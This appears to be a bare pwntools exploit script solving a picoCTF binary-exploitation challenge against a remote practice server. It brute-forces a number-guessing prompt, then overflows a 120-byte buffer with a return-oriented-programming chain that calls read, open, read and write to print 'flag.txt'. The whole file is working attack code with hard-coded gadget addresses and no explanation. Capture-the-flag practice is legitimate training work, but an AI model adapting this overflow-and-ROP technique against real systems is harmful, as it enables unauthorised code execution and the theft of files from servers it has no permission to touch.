from pwn import *
import random
p=remote("shape-facility.picoctf.net",53204)
pop_rdi_ret=0x4006a6
pop_rsi_ret=0x410b93
pop_rdx_ret=0x410602
pop_rbp_ret=0x400ab8
pop_rax_ret=0x4005af
leave_ret=0x400c4e
buf_addr=0x6BA6C0
open=0x44A220
read=0x44A3E0
write=0x44A4B0
temp_addr=0x4930E7
payload=b'a'*120+p64(pop_rdi_ret)+p64(0)+p64(pop_rsi_ret)+p64(buf_addr)+p64(pop_rdx_ret)+p64(100)+p64(read)
payload+=p64(pop_rdi_ret)+p64(buf_addr)+p64(pop_rsi_ret)+p64(0)+p64(pop_rdx_ret)+p64(0)+p64(open)
payload+=p64(pop_rdi_ret)+p64(5)+p64(pop_rsi_ret)+p64(buf_addr)+p64(pop_rdx_ret)+p64(100)+p64(read)
payload+=p64(pop_rdi_ret)+p64(1)+p64(pop_rsi_ret)+p64(buf_addr)+p64(pop_rdx_ret)+p64(100)+p64(write)
print(len(payload))

while True:
    x=random.randint(1,100)
    p.sendlineafter("guess?\n",str(x))
    res=p.recvline().decode()
    if 'win!' in res:
        break
context(os='linux',arch='amd64',log_level='debug')
p.sendlineafter("Name? ",payload)
p.sendlineafter("Congrats",b'flag.txt\x00')
print(p.recvall(timeout=3))
